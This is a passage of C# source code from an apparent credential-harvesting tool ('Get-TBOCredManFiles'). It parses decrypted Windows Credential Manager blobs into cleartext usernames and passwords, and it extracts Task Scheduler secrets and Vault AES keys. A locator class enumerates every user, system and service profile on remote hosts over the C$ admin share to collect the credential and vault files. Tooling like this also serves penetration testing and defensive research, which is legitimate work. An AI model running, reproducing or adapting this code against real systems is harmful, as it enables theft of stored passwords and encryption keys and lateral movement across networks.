			if (!TryReadUnicodeWithLength(payload, ref offset, out var targetAlias))
				return false;
			if (!TryReadUnicodeWithLength(payload, ref offset, out var comment))
				return false;
			if (!TryReadUnicodeWithLength(payload, ref offset, out var unkData))
				return false;
			if (!TryReadUnicodeWithLength(payload, ref offset, out var userName))
				return false;

			if (!TryReadInt32Value(payload, ref offset, out var credBlobLen))
				return false;
			if (credBlobLen < 0 || credBlobLen > payload.Length - offset)
				return false;
			if (!TryReadBytes(payload, ref offset, credBlobLen, out var credBlobBytes))
				return false;

			var lines = new List<string>();
			var hasFields = false;

			hasFields |= AddField(lines, "TargetName", targetName, requireLetters: true);
			hasFields |= AddField(lines, "TargetAlias", targetAlias, requireLetters: true);
			hasFields |= AddField(lines, "Comment", comment, requireLetters: false);
			hasFields |= AddField(lines, "UserName", userName, requireLetters: true);

			if (TryDecodeCredentialValue(credBlobBytes, out var credentialValue, out var credentialHex))
			{
				if (!string.IsNullOrWhiteSpace(credentialValue))
				{
					lines.Add($"Credential: {credentialValue}");
					hasFields = true;
				}
				else if (!string.IsNullOrWhiteSpace(credentialHex))
				{
					lines.Add($"CredentialHex: {credentialHex}");
					hasFields = true;
				}
			}

			if (!hasFields)
				return false;

			if (TryGetFileTimeUtc(lastWritten, out var lastWrittenTime))
				lines.Insert(0, $"LastWritten: {lastWrittenTime:O}");

			text = string.Join(Environment.NewLine, lines);
			return true;
		}

		private static bool TryDecodeVaultPolicyCleartext(byte[] payload, out string? text)
		{
			text = null;

			if (payload.Length < 24)
				return false;

			if (TryParseVaultPolicyKdbm(payload, out var aes128Key, out var aes256Key) ||
				TryParseVaultPolicyKssm(payload, out aes128Key, out aes256Key))
			{
				var lines = new List<string>();
				if (aes128Key != null && aes128Key.Length > 0)
					lines.Add($"VaultAES128: {aes128Key.ToHexString()}");
				if (aes256Key != null && aes256Key.Length > 0)
					lines.Add($"VaultAES256: {aes256Key.ToHexString()}");

				if (lines.Count == 0)
					return false;

				text = string.Join(Environment.NewLine, lines);
				return true;
			}

			return false;
		}

		private static bool TryParseVaultPolicyKdbm(byte[] payload, out byte[]? aes128Key, out byte[]? aes256Key)
		{
			aes128Key = null;
			aes256Key = null;

			if (payload.Length < 40)
				return false;

			var marker = System.Text.Encoding.ASCII.GetString(payload, 12, 4);
			if (!marker.Equals("KDBM", StringComparison.Ordinal))
				return false;

			var offset = 20;
			if (!TryReadInt32Value(payload, ref offset, out var aes128Len))
				return false;
			if (aes128Len != 16 || !TryReadBytes(payload, ref offset, aes128Len, out aes128Key))
				return false;

			offset += 20;
			if (!TryReadInt32Value(payload, ref offset, out var aes256Len))
				return false;
			if (aes256Len != 32 || !TryReadBytes(payload, ref offset, aes256Len, out aes256Key))
				return false;

			return true;
		}

		private static bool TryParseVaultPolicyKssm(byte[] payload, out byte[]? aes128Key, out byte[]? aes256Key)
		{
			aes128Key = null;
			aes256Key = null;

			if (payload.Length < 48)
				return false;

			var marker = System.Text.Encoding.ASCII.GetString(payload, 16, 4);
			if (!marker.Equals("KSSM", StringComparison.Ordinal))
				return false;

			var offset = 16 + 16;
			if (!TryReadInt32Value(payload, ref offset, out var aes128Len))
				return false;
			if (aes128Len != 16 || !TryReadBytes(payload, ref offset, aes128Len, out aes128Key))
				return false;

			var pattern = new byte[] { 0x4b, 0x53, 0x53, 0x4d, 0x02, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00 };
			var index = IndexOfSequence(payload, pattern, offset);
			if (index < 0)
				return false;

			offset = index + 20;
			if (!TryReadInt32Value(payload, ref offset, out var aes256Len))
				return false;
			if (aes256Len != 32 || !TryReadBytes(payload, ref offset, aes256Len, out aes256Key))
				return false;

			return true;
		}

		private static int IndexOfSequence(byte[] payload, byte[] pattern, int start)
		{
			if (pattern.Length == 0 || payload.Length < pattern.Length)
				return -1;

			for (var i = Math.Max(0, start); i <= payload.Length - pattern.Length; i++)
			{
				var match = true;
				for (var j = 0; j < pattern.Length; j++)
				{
					if (payload[i + j] != pattern[j])
					{
						match = false;
						break;
					}
				}

				if (match)
					return i;
			}

			return -1;
		}

		private static bool AddField(List<string> lines, string label, string? value, bool requireLetters)
		{
			if (string.IsNullOrWhiteSpace(value))
				return false;

			var trimmed = value.Trim();
			if (trimmed.Length == 0)
				return false;

			if (!IsMostlyPrintable(trimmed))
				return false;

			if (requireLetters && !HasLetterOrDigit(trimmed))
				return false;

			lines.Add($"{label}: {trimmed}");
			return true;
		}

		private static bool TryDecodeCredentialValue(byte[]? credentialBytes, out string? value, out string? hex)
		{
			value = null;
			hex = null;

			if (credentialBytes == null || credentialBytes.Length == 0)
				return false;

			if (credentialBytes.Length % 2 == 0)
			{
				try
				{
					var unicode = System.Text.Encoding.Unicode.GetString(credentialBytes).TrimEnd('\0');
					if (IsMostlyPrintable(unicode))
					{
						value = unicode.Trim();
						return true;
					}
				}
				catch
				{
				}
			}

			try
			{
				var utf8 = System.Text.Encoding.UTF8.GetString(credentialBytes).TrimEnd('\0');
				if (IsMostlyPrintable(utf8))
				{
					value = utf8.Trim();
					return true;
				}
			}
			catch
			{
			}

			hex = credentialBytes.ToHexString();
			return true;
		}

		private static bool IsPlausibleFileTime(long fileTime)
		{
			if (fileTime <= 0)
				return false;

			if (!TryGetFileTimeUtc(fileTime, out var utc))
				return false;

			var now = DateTime.UtcNow;
			return utc > now.AddYears(-20) && utc < now.AddYears(1);
		}

		private static bool TryGetFileTimeUtc(long fileTime, out DateTime utc)
		{
			utc = default;
			try
			{
				utc = DateTime.FromFileTimeUtc(fileTime);
				return true;
			}
			catch
			{
				return false;
			}
		}

		private static bool TryReadUInt32Value(byte[] payload, ref int offset, out uint value)
		{
			value = 0;
			if (offset < 0 || offset + sizeof(uint) > payload.Length)
				return false;

			value = BinaryPrimitives.ReadUInt32LittleEndian(payload.AsSpan(offset, sizeof(uint)));
			offset += sizeof(uint);
			return true;
		}

		private static bool TryReadInt32Value(byte[] payload, ref int offset, out int value)
		{
			value = 0;
			if (offset < 0 || offset + sizeof(int) > payload.Length)
				return false;

			value = BinaryPrimitives.ReadInt32LittleEndian(payload.AsSpan(offset, sizeof(int)));
			offset += sizeof(int);
			return true;
		}

		private static bool TryReadInt64Value(byte[] payload, ref int offset, out long value)
		{
			value = 0;
			if (offset < 0 || offset + sizeof(long) > payload.Length)
				return false;

			value = BinaryPrimitives.ReadInt64LittleEndian(payload.AsSpan(offset, sizeof(long)));
			offset += sizeof(long);
			return true;
		}

		private static bool TryReadBytes(byte[] payload, ref int offset, int length, out byte[] bytes)
		{
			bytes = Array.Empty<byte>();
			if (length < 0 || offset < 0 || offset + length > payload.Length)
				return false;

			if (length == 0)
			{
				bytes = Array.Empty<byte>();
				return true;
			}

			bytes = new byte[length];
			Array.Copy(payload, offset, bytes, 0, length);
			offset += length;
			return true;
		}

		private static bool TryReadInt32Value(ReadOnlySpan<byte> payload, ref int offset, out int value)
		{
			value = 0;
			if (offset < 0 || offset + sizeof(int) > payload.Length)
				return false;

			value = BinaryPrimitives.ReadInt32LittleEndian(payload.Slice(offset, sizeof(int)));
			offset += sizeof(int);
			return true;
		}

		private static bool TryReadInt64Value(ReadOnlySpan<byte> payload, ref int offset, out long value)
		{
			value = 0;
			if (offset < 0 || offset + sizeof(long) > payload.Length)
				return false;

			value = BinaryPrimitives.ReadInt64LittleEndian(payload.Slice(offset, sizeof(long)));
			offset += sizeof(long);
			return true;
		}

		private static bool TryReadBytes(ReadOnlySpan<byte> payload, ref int offset, int length, out byte[] bytes)
		{
			bytes = Array.Empty<byte>();
			if (length < 0 || offset < 0 || offset + length > payload.Length)
				return false;

			if (length == 0)
			{
				bytes = Array.Empty<byte>();
				return true;
			}

			bytes = payload.Slice(offset, length).ToArray();
			offset += length;
			return true;
		}

		private static bool TryReadUnicodeString(ReadOnlySpan<byte> payload, ref int offset, int length, out string value)
		{
			value = string.Empty;

			if (length < 0 || length > MaxCredentialStringBytes)
				return false;
			if (offset < 0 || offset + length > payload.Length)
				return false;

			try
			{
				value = System.Text.Encoding.Unicode.GetString(payload.Slice(offset, length)).TrimEnd('\0');
			}
			catch
			{
				return false;
			}

			offset += length;
			return true;
		}

		private static bool TryReadUnicodeWithLength(byte[] payload, ref int offset, out string value)
		{
			value = string.Empty;

			if (!TryReadInt32Value(payload, ref offset, out var length))
				return false;
			if (length < 0 || length > MaxCredentialStringBytes)
				return false;
			if (offset < 0 || offset + length > payload.Length)
				return false;

			try
			{
				value = System.Text.Encoding.Unicode.GetString(payload, offset, length).TrimEnd('\0');
			}
			catch
			{
				return false;
			}

			offset += length;
			return true;
		}

		private static string? TryExtractReadableCleartext(byte[] payload)
		{
			return SecretDecoding.TryExtractReadableFragments(payload, CredManFragmentOptions);
		}

		private static bool TryDecodeTaskSchedulerCleartext(byte[] payload, out string? text)
		{
			text = null;

			if (TaskSchedulerMarkerBytes.Length == 0)
				return false;

			var markerIndex = payload.AsSpan().IndexOf(TaskSchedulerMarkerBytes);
			if (markerIndex < 4)
				return false;

			if (!TryReadUInt32(payload, markerIndex - 4, out var targetLength))
				return false;
			if (!TryReadUnicodeString(payload, markerIndex, targetLength, out var target))
				return false;

			var offset = markerIndex + targetLength;
			offset = SkipNullBytes(payload, offset);

			if (!TryReadLengthPrefixedUnicode(payload, ref offset, out var userName))
				return false;

			offset = SkipNullBytes(payload, offset);

			if (!TryReadLengthPrefixedUnicode(payload, ref offset, out var secret))
				return false;

			text = string.Join(Environment.NewLine, new[] { target, userName, secret });
			return true;
		}

		private static bool TryReadLengthPrefixedUnicode(byte[] payload, ref int offset, out string? value)
		{
			value = null;

			if (!TryReadUInt32(payload, offset, out var length))
				return false;

			offset += sizeof(uint);
			if (!TryReadUnicodeString(payload, offset, length, out value))
				return false;

			offset += length;
			return true;
		}

		private static bool TryReadUnicodeString(byte[] payload, int offset, int length, out string? value)
		{
			value = null;

			if (length <= 0)
				return false;
			if (offset < 0 || offset >= payload.Length)
				return false;

			var byteLength = length;
			if (byteLength % 2 != 0)
			{
				var altLength = checked(length * 2);
				if (offset + altLength > payload.Length)
					return false;
				byteLength = altLength;
			}

			if (offset + byteLength > payload.Length)
				return false;

			string decoded;
			try
			{
				decoded = System.Text.Encoding.Unicode.GetString(payload, offset, byteLength).TrimEnd('\0');
			}
			catch
			{
				return false;
			}

			if (!IsLikelyText(decoded))
				return false;

			value = decoded;
			return true;
		}

		private static int SkipNullBytes(byte[] payload, int offset)
		{
			var current = offset;
			while (current + 1 < payload.Length && payload[current] == 0 && payload[current + 1] == 0)
				current += 2;
			return current;
		}

		private static bool TryReadUInt32(byte[] payload, int offset, out int value)
		{
			value = 0;
			if (offset < 0 || offset + sizeof(uint) > payload.Length)
				return false;

			var raw = BinaryPrimitives.ReadUInt32LittleEndian(payload.AsSpan(offset, sizeof(uint)));
			if (raw > int.MaxValue)
				return false;

			value = (int)raw;
			return true;
		}

		private static bool IsLikelyText(string? text)
		{
			if (string.IsNullOrWhiteSpace(text))
				return false;

			int printable = 0;
			int ascii = 0;
			int nonAscii = 0;
			foreach (var ch in text)
			{
				if (!char.IsControl(ch) || ch == '\r' || ch == '\n' || ch == '\t')
				{
					printable++;
					if (ch <= '\u007e')
						ascii++;
					else
						nonAscii++;
				}
			}

			if (printable < text.Length * 0.8)
				return false;

			if (ascii < Math.Max(8, text.Length * 0.5))
				return false;

			if (nonAscii > text.Length * 0.4)
				return false;

			return true;
		}

		private static bool IsMostlyPrintable(string text)
		{
			if (string.IsNullOrEmpty(text))
				return false;

			var printable = 0;
			foreach (var ch in text)
			{
				if (!char.IsControl(ch) || ch == '\r' || ch == '\n' || ch == '\t')
					printable++;
			}

			return printable >= Math.Max(1, text.Length * 0.8);
		}

		private static bool HasLetterOrDigit(string text)
		{
			foreach (var ch in text)
			{
				if (char.IsLetterOrDigit(ch))
					return true;
			}

			return false;
		}

		private sealed class CredManDecryptResult
		{
			public static CredManDecryptResult None { get; } = new();

			public string? CredentialGuid { get; init; }
			public string? MasterKeyGuid { get; init; }
			public uint Flags { get; init; }
			public string? Description { get; init; }
			public uint CryptAlgorithmId { get; init; }
			public string? CryptAlgorithm { get; init; }
			public uint HashAlgorithmId { get; init; }
			public string? HashAlgorithm { get; init; }
			public byte[]? Cleartext { get; init; }
			public bool HmacValidated { get; init; }
			public string? FailureReason { get; init; }
		}
	}

	internal static class CredManLocator
	{
		internal const string DefaultShareName = "C$";

		private static readonly string[] UserCredentialRoots =
		{
			@"AppData\Local\Microsoft\Credentials"
		};

		private static readonly string[] UserVaultRoots =
		{
			@"AppData\Local\Microsoft\Vault"
		};

		private static readonly string[] MachineProfiles =
		{
			@"Windows\System32\config\systemprofile",
			@"Windows\ServiceProfiles\LocalService",
			@"Windows\ServiceProfiles\NetworkService"
		};

		internal static IReadOnlyList<TboCredManFileInfo> Enumerate(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			CredManScope scope,
			IReadOnlyList<WildcardPattern> userFilters,
			bool includeSystemProfiles,
			Action<string>? writeWarning,
			Action<string>? writeVerbose,
			Action<string, Exception>? logException,
			CancellationToken cancellationToken)
		{
			writeWarning ??= _ => { };
			writeVerbose ??= _ => { };
			logException ??= (context, ex) => smb.LogException(context, ex);

			var results = new List<TboCredManFileInfo>();

			if (scope.HasFlag(CredManScope.User))
				EnumerateUserProfiles(smb, serverName, shareName, userFilters, results, writeWarning, writeVerbose, logException, cancellationToken);

			if (scope.HasFlag(CredManScope.Machine) && includeSystemProfiles)
				EnumerateMachineProfiles(smb, serverName, shareName, results, writeWarning, writeVerbose, logException, cancellationToken);

			return results;
		}

		private static void EnumerateUserProfiles(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			IReadOnlyList<WildcardPattern> userFilters,
			List<TboCredManFileInfo> results,
			Action<string> writeWarning,
			Action<string> writeVerbose,
			Action<string, Exception> logException,
			CancellationToken cancellationToken)
		{
			var usersRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users");
			var fileSystem = ResolveFileSystem(smb);

			ISmbDirectory? usersDir = null;
			try
			{
				usersDir = fileSystem.OpenDirectory(usersRoot, cancellationToken);
				foreach (var entry in usersDir.QueryEntries("*", Smb2Directory.Smb2DirQueryOptions.None, SecurityInfo.None, Smb2Directory.DefaultQueryBufferSize, cancellationToken))
				{
					if (string.IsNullOrEmpty(entry.FileName))
						continue;
					if (entry.FileName is "." or "..")
						continue;

					bool isDirectory = (entry.FileAttributes & Winterop.FileAttributes.Directory) != 0;
					bool isReparse = (entry.FileAttributes & Winterop.FileAttributes.ReparsePoint) != 0;
					if (!isDirectory || isReparse)
						continue;

					if (!MatchesUserFilter(entry.FileName, userFilters))
						continue;

					var profileRoot = usersRoot.Append(entry.FileName);
					EnumerateProfileContainers(
						smb,
						profileRoot,
						serverName,
						"User",
						entry.FileName,
						isSystemProfile: false,
						results,
						writeWarning,
						writeVerbose,
						logException,
						cancellationToken);
				}
			}
			catch (NtstatusException ex) when (CredManHelpers.IsMissingPath(ex))
			{
				writeVerbose($"Get-TBOCredManFiles could not open {usersRoot}: {ex.StatusCode}.");
			}
			catch (NtstatusException ex) when (CredManHelpers.IsAccessDenied(ex))
			{
				writeWarning($"Get-TBOCredManFiles was denied access to {usersRoot}: {ex.StatusCode}.");
			}
			catch (Exception ex)
			{
				logException($"Get-TBOCredManFiles failed to enumerate {usersRoot}", ex);
				throw;
			}
			finally
			{
				if (usersDir != null)
					usersDir.Dispose();
			}
		}

		private static void EnumerateMachineProfiles(
			ISmbProviderInfo smb,
			string serverName,
			string shareName,
			List<TboCredManFileInfo> results,
			Action<string> writeWarning,
			Action<string> writeVerbose,
			Action<string, Exception> logException,
			CancellationToken cancellationToken)
		{
			foreach (var profile in MachineProfiles)
			{
				var profileRoot = UncPath.Parse($@"\\{serverName}\{shareName}\{profile}");
				var profileName = GetProfileName(profile);
				EnumerateProfileContainers(
					smb,
					profileRoot,
					serverName,
					"Machine",
					profileName,
					isSystemProfile: true,
					results,
					writeWarning,
					writeVerbose,
					logException,
					cancellationToken);
			}
		}

		private static void EnumerateProfileContainers(
			ISmbProviderInfo smb,
			UncPath profileRoot,
			string serverName,
			string scope,
			string profileName,
			bool isSystemProfile,
			List<TboCredManFileInfo> results,
			Action<string> writeWarning,
			Action<string> writeVerbose,
			Action<string, Exception> logException,
			CancellationToken cancellationToken)
		{
			foreach (var relative in UserCredentialRoots)
			{
				var credRoot = profileRoot.Append(relative);
				EnumerateCredentialDirectory(
					smb,
					credRoot,
					serverName,
					scope,
					profileName,
					isSystemProfile,
					results,
					writeWarning,
					writeVerbose,
					logException,
					cancellationToken);
			}

			foreach (var relative in UserVaultRoots)
			{
				var vaultRoot = profileRoot.Append(relative);
				EnumerateVaultDirectory(
					smb,
					vaultRoot,
					serverName,
					scope,
					profileName,
					isSystemProfile,
					results,
					writeWarning,
					writeVerbose,
					logException,
					cancellationToken);
			}
		}

		private static void EnumerateCredentialDirectory(
			ISmbProviderInfo smb,
			UncPath directoryPath,
			string serverName,
			string scope,
			string profileName,
			bool isSystemProfile,
			List<TboCredManFileInfo> results,
			Action<string> writeWarning,
			Action<string> writeVerbose,
			Action<string, Exception> logException,
			CancellationToken cancellationToken)
		{
			EnumerateFiles(
				smb,
				directoryPath,
				entry => results.Add(new TboCredManFileInfo
				{
					ServerName = serverName,
					Scope = scope,
					UserName = profileName,
					UserSid = null,
					ProfilePath = GetProfilePath(directoryPath, UserCredentialRoots),
					Container = "Credentials",
					VaultGuid = null,
					FileName = entry.FileName ?? string.Empty,
					Path = directoryPath.Append(entry.FileName ?? string.Empty).ToString(),
					FileSize = entry.Size,
					FileCreationTime = entry.CreationTime,
					FileLastWriteTime = entry.LastWriteTime,
					FileLastChangeTime = entry.LastChangeTime,
					IsSystemProfile = isSystemProfile
				}),
				writeWarning,
				writeVerbose,
				logException,
				cancellationToken);
		}

		private static void EnumerateVaultDirectory(
			ISmbProviderInfo smb,
			UncPath vaultRoot,
			string serverName,
			string scope,
			string profileName,
			bool isSystemProfile,
			List<TboCredManFileInfo> results,
			Action<string> writeWarning,
			Action<string> writeVerbose,
			Action<string, Exception> logException,
			CancellationToken cancellationToken)
		{
			var fileSystem = ResolveFileSystem(smb);
			ISmbDirectory? rootDir = null;
			try
			{
				rootDir = fileSystem.OpenDirectory(vaultRoot, cancellationToken);
				foreach (var entry in rootDir.QueryEntries("*", Smb2Directory.Smb2DirQueryOptions.None, SecurityInfo.None, Smb2Directory.DefaultQueryBufferSize, cancellationToken))
				{
					if (string.IsNullOrEmpty(entry.FileName))
						continue;
					if (entry.FileName is "." or "..")
						continue;

					bool isDirectory = (entry.FileAttributes & Winterop.FileAttributes.Directory) != 0;
					bool isReparse = (entry.FileAttributes & Winterop.FileAttributes.ReparsePoint) != 0;
					if (!isDirectory || isReparse)
						continue;

					var vaultGuid = TryParseGuid(entry.FileName);
					var vaultDir = vaultRoot.Append(entry.FileName);
					EnumerateFiles(
						smb,
						vaultDir,
						fileEntry => results.Add(new TboCredManFileInfo
						{
							ServerName = serverName,
							Scope = scope,
							UserName = profileName,
							UserSid = null,
							ProfilePath = GetProfilePath(vaultRoot, UserVaultRoots),
							Container = "Vault",
							VaultGuid = vaultGuid,
							FileName = fileEntry.FileName ?? string.Empty,
							Path = vaultDir.Append(fileEntry.FileName ?? string.Empty).ToString(),
							FileSize = fileEntry.Size,
							FileCreationTime = fileEntry.CreationTime,
							FileLastWriteTime = fileEntry.LastWriteTime,
							FileLastChangeTime = fileEntry.LastChangeTime,
							IsSystemProfile = isSystemProfile
						}),
						writeWarning,
						writeVerbose,
						logException,
						cancellationToken);
				}
			}
			catch (NtstatusException ex) when (CredManHelpers.IsMissingPath(ex))
			{
				writeVerbose($"Get-TBOCredManFiles could not open {vaultRoot}: {ex.StatusCode}.");
			}
			catch (NtstatusException ex) when (CredManHelpers.IsAccessDenied(ex))
			{
				writeWarning($"Get-TBOCredManFiles was denied access to {vaultRoot}: {ex.StatusCode}.");
			}
			catch (Exception ex)
			{
				logException($"Get-TBOCredManFiles failed to enumerate {vaultRoot}", ex);
				throw;
			}
			finally
			{
				if (rootDir != null)
					rootDir.Dispose();
			}
		}

		private static void EnumerateFiles(
			ISmbProviderInfo smb,
			UncPath directoryPath,
			Action<Smb2DirEntry> handleFile,
			Action<string> writeWarning,
			Action<string> writeVerbose,
			Action<string, Exception> logException,
			CancellationToken cancellationToken)
		{
			var fileSystem = ResolveFileSystem(smb);
			ISmbDirectory? dir = null;
			try
			{
				dir = fileSystem.OpenDirectory(directoryPath, cancellationToken);
				foreach (var entry in dir.QueryEntries("*", Smb2Directory.Smb2DirQueryOptions.None, SecurityInfo.None, Smb2Directory.DefaultQueryBufferSize, cancellationToken))
				{
					if (string.IsNullOrEmpty(entry.FileName))
						continue;
					if (entry.FileName is "." or "..")
						continue;

					bool isDirectory = (entry.FileAttributes & Winterop.FileAttributes.Directory) != 0;
					if (isDirectory)
						continue;

					handleFile(entry);
				}
			}
			catch (NtstatusException ex) when (CredManHelpers.IsMissingPath(ex))
			{
				writeVerbose($"Get-TBOCredManFiles could not open {directoryPath}: {ex.StatusCode}.");
			}
			catch (NtstatusException ex) when (CredManHelpers.IsAccessDenied(ex))
			{
				writeWarning($"Get-TBOCredManFiles was denied access to {directoryPath}: {ex.StatusCode}.");
			}
			catch (Exception ex)
			{
				logException($"Get-TBOCredManFiles failed to enumerate {directoryPath}", ex);
				throw;
			}
			finally
			{
				if (dir != null)
					dir.Dispose();
			}
		}

		private static ISmbFileSystem ResolveFileSystem(ISmbProviderInfo smb)
		{
			return SmbFileSystemResolver.Resolve(smb);
		}

		private static string GetProfileName(string profileRoot)
		{
			if (string.IsNullOrWhiteSpace(profileRoot))
				return "SYSTEM";

			var parts = profileRoot.Split(new[] { '\\', '/' }, StringSplitOptions.RemoveEmptyEntries);
			return parts.Length > 0 ? parts[parts.Length - 1] : profileRoot;
		}

		private static string? GetProfilePath(UncPath containerPath, string[] rootMarkers)
		{
			foreach (var marker in rootMarkers)
			{
				var index = containerPath.ShareRelativePath.IndexOf(marker, StringComparison.OrdinalIgnoreCase);
				if (index >= 0)
				{
					var profileRelative = containerPath.ShareRelativePath.Substring(0, index).TrimEnd('\\');
					if (string.IsNullOrWhiteSpace(profileRelative))
						return null;
					return $@"\\{containerPath.ServerName}\{containerPath.ShareName}\{profileRelative}";
				}
			}

			return null;
		}

		private static string? TryParseGuid(string name)
		{
			if (string.IsNullOrWhiteSpace(name))
				return null;

			if (Guid.TryParse(name.Trim('{', '}'), out var guid))
				return guid.ToString();

			return null;
		}

		private static bool MatchesUserFilter(string name, IReadOnlyList<WildcardPattern> filters)
		{
			if (filters.Count == 0)
				return true;
			foreach (var pattern in filters)
			{
				if (pattern.IsMatch(name))
					return true;
			}

			return false;
		}

	}
}
